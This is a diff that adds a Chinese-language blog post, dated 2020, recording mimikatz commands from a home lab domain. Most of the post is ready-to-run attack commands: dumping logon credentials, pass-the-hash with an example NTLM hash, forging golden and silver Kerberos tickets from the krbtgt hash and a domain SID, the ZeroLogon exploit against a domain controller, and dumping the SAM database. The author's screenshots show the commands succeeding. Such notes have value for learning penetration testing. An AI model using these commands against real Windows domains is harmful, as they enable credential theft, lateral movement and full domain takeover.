@@ -1,0 +1,145 @@
+---
+layout: post
+title: mimikatz使用命令记录
+date: 2020-11-22 17:18:12 +0900
+category: windows
+---
+mimikatz地址：[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
+
+参考：
+
+[内网横向移动：Kerberos认证与(哈希)票据传递攻击](https://www.freebuf.com/articles/network/245872.html)
+
+[从mimikatz学Windows本地hash抓取](https://xz.aliyun.com/t/8601)
+
+目录:
+
+#### 1.PTH
+
+```cpp
+privilege::debug
+sekurlsa::logonpasswords
+```
+```cpp
+privilege::debug
+sekurlsa::pth /user:administrator /domain:workgroup /ntlm:aa82c4733abe54954101a3c071563bd5
+```
+#### 2.黄金票据
+```cpp
+privilege::debug
+lsadump::lsa /patch // 专用于在域控制器上导出用户密码或hash
+```
+
+```cpp
+kerberos::golden /user:administrator /domain:lee.com /sid:S-1-5-21-3818984818-544466857-344315463 /krbtgt:89d0242fe92b9cee9361dd4c86fc5233 /ticket:ticket.kirbi
+
+kerberos::ptt ticket.kirbi
+kerberos::tgt
+```
+#### 3.白银票据
+```cpp
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+```cpp
+kerberos::golden /domain:LEE.com /sid:S-1-5-21-3818984818-544466857-344315463 /target:WIN-8U952PQ1T6L.lee.com /rc4:9186eda109780d30ac9cdfda733442ac /service:cifs /user:douser /ptt
+```
+
+#### 4.ZeroLogon
+```cpp
+lsadump::zerologon /target:WIN-8U952PQ1T6L.lee.com /ntlm /null /account:dc$ /exploit
+```
+#### 5.SAM
+```cpp
+privilege::debug
+token::elevate
+lsadump::sam
+```
+环境:
+
+域服务器 Server2012
+
+域机器:win7 x64
+
+域lee
+
+## 一.PTH
+
+域服务器获取NTLM-Hash值
+
+privilege::debug
+
+sekurlsa::logonpasswords
+
+![1](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/1.png)
+
+找到Administrator的NTLM-Hash值
+
+![2](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/2.png)
+
+域内普通机器通过NTLM-Hash攻击
+
+privilege::debug
+
+sekurlsa::pth /user:administrator /domain:workgroup /ntlm:aa82c4733abe54954101a3c071563bd5
+
+![3](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/3.png)
+
+执行成功会弹出一个cmd窗口，可以远程在域服务器上执行命令
+
+![4](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/4.png)
+
+## 二、黄金票据
+
+privilege::debug
+
+lsadump::lsa /patch // 专用于在域控制器上导出用户密码或hash
+
+在域服务器上执行命令，获得krbtgt的NTLM的Hash值
+
+![5](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/5.png)
+
+在内网机器上执行以下命令，生成ticket.kirbi黄金票据
+
+kerberos::golden /user:administrator /domain:lee.com /sid:S-1-5-21-3818984818-544466857-344315463 /krbtgt:89d0242fe92b9cee9361dd4c86fc5233 /ticket:ticket.kirbi
+
+![6](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/6.png)
+
+kerberos::ptt ticket.kirbi
+
+kerberos::tgt
+
+使用票据启动cmd，就可以执行了
+
+![7](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/7.png)
+
+## 三、白银票据
+
+privilege::debug
+
+sekurlsa::logonpasswords
+
+![8](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/8.png)
+
+![9](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/9.png)
+
+使用域机器普通账户的NTLM-Hash值，不是Administrator的
+
+在域内机器上执行以下命令，生成白银票据
+
+kerberos::golden /domain:LEE.com /sid:S-1-5-21-3818984818-544466857-344315463 /target:WIN-8U952PQ1T6L.lee.com /rc4:9186eda109780d30ac9cdfda733442ac /service:cifs /user:douser /ptt
+
+![10](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/10.png)
+
+## 四、ZeroLogon
+
+lsadump::zerologon /target:WIN-8U952PQ1T6L.lee.com /ntlm /null /account:dc$ /exploit
+
+![11](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/11.png)
+
+## 五、SAM
+
+lsadump::sam
+
+![12](https://raw.githubusercontent.com/LycorisGuard/BlogPic/master/2020-11-22/12.png)
